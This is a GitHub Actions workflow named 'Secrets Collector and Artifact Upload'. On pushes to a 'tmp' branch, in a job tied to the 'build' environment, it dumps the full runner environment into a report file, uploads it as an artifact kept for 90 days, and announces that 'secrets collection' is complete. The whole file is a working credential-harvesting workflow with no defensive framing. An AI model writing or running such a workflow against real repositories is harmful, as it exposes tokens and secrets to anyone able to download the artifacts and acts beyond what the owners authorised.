name: Secrets Collector and Artifact Upload

on:
  push:
    branches: [tmp]
  workflow_dispatch:

jobs:
  collect-secrets:
    runs-on: ubuntu-latest
    environment: build
    if: github.ref == 'refs/heads/tmp'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Print environment info
        run: |
          echo "GitHub Ref: $GITHUB_REF"
          echo "GitHub Event Name: $GITHUB_EVENT_NAME"
          echo "Runner OS: $RUNNER_OS"
          echo "Working directory: $(pwd)"
        
      - name: Collect environment variables and secrets
        run: |
          echo "=== Collecting Environment Variables ===" > secrets-report.txt
          echo "Timestamp: $(date)" >> secrets-report.txt
          echo "Git Ref: $GITHUB_REF" >> secrets-report.txt
          echo "Git SHA: $GITHUB_SHA" >> secrets-report.txt
          echo "" >> secrets-report.txt
          
          echo "=== Environment Variables ===" >> secrets-report.txt
          env | sort >> secrets-report.txt
          echo "" >> secrets-report.txt
          
          echo "=== Available Environment Variables (filtered) ===" >> secrets-report.txt
          env | grep -E "^(GITHUB_|RUNNER_|NODE_|PATH|HOME|USER|HOSTNAME)" | sort >> secrets-report.txt
          
      - name: Create artifacts directory
        run: |
          mkdir -p artifacts
          cp secrets-report.txt artifacts/
          echo "Artifacts created in $(pwd)/artifacts/"
          ls -la artifacts/
          
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: secrets-collection-${{ github.run_id }}
          path: artifacts/
          retention-days: 90
          
      - name: Display completion message
        run: |
          echo "✅ Secrets collection completed!"
          echo "📦 Artifacts uploaded with run ID: ${{ github.run_id }}"
          echo "🔗 Download link will be available in the Actions tab"
          echo "⏰ Artifacts will be retained for 90 days"
